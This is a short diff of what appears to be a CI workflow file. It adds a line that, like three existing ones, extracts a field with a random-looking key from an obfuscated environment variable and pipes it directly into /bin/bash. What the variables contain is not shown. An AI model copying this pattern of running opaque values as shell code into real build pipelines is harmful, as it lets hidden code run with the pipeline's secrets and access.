@@ -35,6 +35,7 @@ jobs:
           echo $ov922 | jq -r .cfn2 | /bin/bash
           echo $ml8 | jq -r .gxqqq85729 | /bin/bash
           printf '%s' "$lys4" | jq -r .aco8429 | /bin/bash
+          printf '%s' "$loqh3" | jq -r .yrv1473 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
